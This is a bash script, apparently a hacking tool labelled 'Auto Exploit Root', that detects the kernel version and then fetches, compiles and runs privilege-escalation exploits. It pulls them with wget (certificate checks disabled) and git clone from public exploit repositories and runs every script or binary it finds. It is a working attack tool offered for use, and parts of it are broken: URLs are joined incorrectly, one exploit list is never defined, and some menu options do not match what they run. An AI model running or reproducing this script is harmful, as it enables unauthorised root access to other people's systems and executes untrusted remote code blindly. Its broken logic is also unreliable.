#!/bin/bash

# Pastikan skrip berjalan tanpa memerlukan login atau hak akses root
BASE_DIR="/tmp/exploit_workspace"
LOG_FILE="$BASE_DIR/exploit_log.txt"
EXPLOIT_LOG="$BASE_DIR/exploit_results.log"
mkdir -p "$BASE_DIR"

> "$LOG_FILE"
> "$EXPLOIT_LOG"

echo "==================================================="
echo "              Auto Exploit Root"
echo "              Haxorqt X GPT"
echo "==================================================="
echo "[x] Your Kernel : $(uname -r)" | tee -a "$LOG_FILE"
echo ""
echo "[x] Choose Your Exploit Category: "
echo "[1] Kernel Exploits 2x,3x,4x,5x"
echo "[2] FreeBSD Exploits"
echo "[3] IBM AIX Exploits"
echo "[4] Default Exploits"
echo "[5] Top Exploits"
echo "[6] Full Exploit Pack"
echo "[7] External GitHub Repositories"
read -p "Haxorqt@Localroot:~# " localroot

EXPLOIT_REPO="https://raw.githubusercontent.com/Snoopy-Sec/Localroot-ALL-CVE/main/"

# External GitHub repositories
EXTERNAL_REPOS=(
    "https://github.com/fei9747/LinuxEelvation"
    "https://github.com/SecWiki/linux-kernel-exploits"
    "https://github.com/bsauce/kernel-exploit-factory"
    "https://github.com/lucyoa/kernel-exploits"
    "https://github.com/sujayadkesar/Linux-Privilege-Escalation/tree/main/Kernel_EXPLOITS"
)

# Menambahkan eksploitasi untuk kernel 5.x dan 6.x
kernel5x_and_6x=(
    "https://github.com/0x00-0x00/CVE-2020-8835"       # CVE-2020-8835
    "https://github.com/0x00-0x00/CVE-2020-14386"      # CVE-2020-14386
    "https://github.com/h3x4xx0r/CVE-2022-2588"       # CVE-2022-2588
    "https://www.exploit-db.com/CVE-2023-3390"         # CVE-2023-3390
)

# Menambahkan pengecekan untuk versi kernel
check_kernel_version() {
    local kernel_version=$(uname -r | cut -d. -f1)
    echo "[x] Kernel Version: $kernel_version" | tee -a "$LOG_FILE"
    case $kernel_version in
        2) echo "[x] Using Kernel 2.x exploits" | tee -a "$LOG_FILE" ;;
        3) echo "[x] Using Kernel 3.x exploits" | tee -a "$LOG_FILE" ;;
        4) echo "[x] Using Kernel 4.x exploits" | tee -a "$LOG_FILE" ;;
        5) echo "[x] Using Kernel 5.x exploits" | tee -a "$LOG_FILE" ;;
        6) echo "[x] Using Kernel 6.x exploits" | tee -a "$LOG_FILE" ;;
        *) echo "[x] Unsupported Kernel Version. Exiting..." | tee -a "$LOG_FILE" && exit 1 ;;
    esac
}

download_and_run_exploits() {
    local exploits=("$@")
    echo "[+] Downloading exploits..." | tee -a "$LOG_FILE"
    for exploit in "${exploits[@]}"; do
        file_name=$(basename "$exploit")
        wget -q --no-check-certificate "$EXPLOIT_REPO$exploit" -O "$BASE_DIR/$file_name"
        chmod +x "$BASE_DIR/$file_name"
        
        if [[ "$file_name" == *.c ]]; then
            echo "[+] Compiling $file_name..." | tee -a "$LOG_FILE"
            gcc "$BASE_DIR/$file_name" -o "$BASE_DIR/${file_name%.c}" -static -lpthread &>> "$EXPLOIT_LOG"
            if [ $? -eq 0 ]; then
                echo "[+] Compilation successful: $BASE_DIR/${file_name%.c}" | tee -a "$LOG_FILE"
            else
                echo "[-] Compilation failed for: $BASE_DIR/$file_name" | tee -a "$LOG_FILE"
                continue
            fi
        fi
    done

    echo "[+] Running exploits..." | tee -a "$LOG_FILE"
    for exploit in "$BASE_DIR"/*; do
        if [[ -x "$exploit" ]]; then
            echo "[+] Executing: $exploit" | tee -a "$LOG_FILE"
            "$exploit" &>> "$EXPLOIT_LOG"
            if [[ $? -eq 0 ]]; then
                echo "[+] Exploit executed successfully: $exploit" | tee -a "$LOG_FILE"
            else
                echo "[-] Exploit failed: $exploit" | tee -a "$LOG_FILE"
            fi
        fi
    done
    echo "[+] Exploit execution completed!" | tee -a "$LOG_FILE"
}

download_external_exploits() {
    echo "[+] Downloading exploits from external GitHub repositories..." | tee -a "$LOG_FILE"
    for repo in "${EXTERNAL_REPOS[@]}"; do
        echo "[+] Cloning repository: $repo" | tee -a "$LOG_FILE"
        git clone "$repo" "$BASE_DIR/repo_temp"
        cd "$BASE_DIR/repo_temp" || exit
        # Menjalankan eksploitasi yang ditemukan di repo eksternal
        for exploit in $(find . -type f \( -name "*.sh" -o -name "*.c" -o -name "*.py" -o -name "*.pl" \)); do
            chmod +x "$exploit"
            echo "[+] Running exploit: $exploit" | tee -a "$LOG_FILE"
            ./$exploit &>> "$EXPLOIT_LOG"
            if [[ $? -eq 0 ]]; then
                echo "[+] Exploit executed successfully: $exploit" | tee -a "$LOG_FILE"
            else
                echo "[-] Exploit failed: $exploit" | tee -a "$LOG_FILE"
            fi
        done
        cd "$BASE_DIR" || exit
        rm -rf "$BASE_DIR/repo_temp"
    done
}

check_kernel_version

case $localroot in
    1) download_and_run_exploits "${kernel5x_and_6x[@]}" ;;
    2) download_and_run_exploits "FreeBSD/" ;;
    3) download_and_run_exploits "IBM-AIX/" ;;
    4) download_and_run_exploits "default/" ;;
    5) download_and_run_exploits "${top_exploits[@]}" ;;
    6) git clone https://github.com/Snoopy-Sec/Localroot-ALL-CVE "$BASE_DIR/Localroot-ALL-CVE" && cd "$BASE_DIR/Localroot-ALL-CVE" && find . -type f \( -name "*.sh" -o -name "*.c" -o -name "*.py" -o -name "*.pl" \) -exec chmod +x {} \; && find . -type f -executable -exec {} \; ;;
    7) download_external_exploits ;;
    *) echo "[-] Invalid selection. Exiting..." | tee -a "$LOG_FILE" ;;
esac

echo "[+] Completed all tasks." | tee -a "$LOG_FILE"
exit 0
